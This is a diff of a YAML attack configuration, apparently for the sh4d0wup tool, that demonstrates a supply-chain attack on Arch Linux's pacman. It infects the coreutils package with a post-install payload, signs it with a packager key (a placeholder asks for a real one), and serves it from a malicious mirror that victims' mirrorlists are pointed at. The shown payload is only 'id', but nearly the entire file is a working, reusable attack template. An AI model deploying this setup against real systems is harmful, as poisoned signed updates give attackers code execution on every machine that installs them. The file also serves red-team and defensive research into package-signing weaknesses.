@@ -1,41 +1,61 @@
 ---
 
+# This plot demonstrates an attack on pacman by using a packager key to sign a
+# malicious update with a patched post-install hook. For demonstration purpose
+# we generate a key and mark it as trusted with --lsign.
+
 upstreams:
   archlinux:
     url: https://geo.mirror.pkgbuild.com/
 
+## It's possible to use `selector: target` on a route to so it's only active
+## for eg. some ip addresses.
+#selectors:
+#  target:
+#    type: ipaddr
+#    ipaddr: 1.3.3.7
+
 signing_keys:
-  pwn:
+  legit:
     type: pgp
-    uids: ["pwn"]
+    ## PUT PACKAGER KEY HERE, then remove `uids:`
+    uids: ["John Doe <no-reply@example.com>"]
+    # secret_key: |
+    #   -----BEGIN PGP PRIVATE KEY BLOCK-----
+    #   Comment: 5AB2 9B80 E5DD DFF3 3A66  F4B8 8BD9 B381 CC2F E056
+    #
+    #   xVgEY6c7FhYJKwYBBAHaRw8BAQdA9Vw9iHReU5IoDR3Dq34alsBQOB+tmRQlEaU7
+    #   DN9M0uQAAQCMZs/KxBa44U5OhVx41n7s43vPcobz5b5kwHYXIdI50BKcwsALBB8W
+    #   CgB9BY...
 
 artifacts:
-  coreutils_upstream:
+  pkg_upstream:
     type: url
     url: https://geo.mirror.pkgbuild.com/core/os/x86_64/coreutils-9.1-3-x86_64.pkg.tar.zst
     sha256: 43dfb7cee3765a5e95a8ef463712f2955fdc0f8c84a2a62d053bb67b0ee7f614
-  coreutils:
+  pkg_infected:
     type: infect
     infect: pacman
-    artifact: coreutils_upstream
+    artifact: pkg_upstream
     set:
       pkgver:
         - 9.1-777
-    payload: id
-  coreutils_sig:
+    payload: |
+      id
+  sig_infected:
     type: signature
-    artifact: coreutils
-    sign_with: pwn
+    artifact: pkg_infected
+    sign_with: legit
 
 check:
   image: archlinux
   install_keys:
-    - key: pwn
+    - key: legit
       cmd: "tee /tmp/pwn.pgp > /dev/null"
   cmds:
     - ["pacman-key", "--init"]
     - ["pacman-key", "--add", "/tmp/pwn.pgp"]
-    - ["pacman-key", "--lsign", "pwn"]
+    - ["pacman-key", "--lsign", "John Doe <no-reply@example.com>"]
     - 'echo "Server = http://${SH4D0WUP_BOUND_ADDR}/\$repo/os/\$arch" | tee /etc/pacman.d/mirrorlist'
     - ["pacman", "-Suy", "--noconfirm"]
 
@@ -46,8 +66,8 @@ routes:
       upstream: archlinux
       patch:
         - name: coreutils
-          artifact: coreutils
-          signature: coreutils_sig
+          artifact: pkg_infected
+          signature: sig_infected
           set:
             "%VERSION%":
               - 9.1-777
@@ -58,11 +78,11 @@ routes:
   - path: "/core/os/x86_64/coreutils-9.1-777-x86_64.pkg.tar.zst"
     type: static
     args:
-      artifact: coreutils
+      artifact: pkg_infected
   - path: "/core/os/x86_64/coreutils-9.1-777-x86_64.pkg.tar.zst.sig"
     type: static
     args:
-      artifact: coreutils_sig
+      artifact: sig_infected
   - type: proxy
     args:
       upstream: archlinux
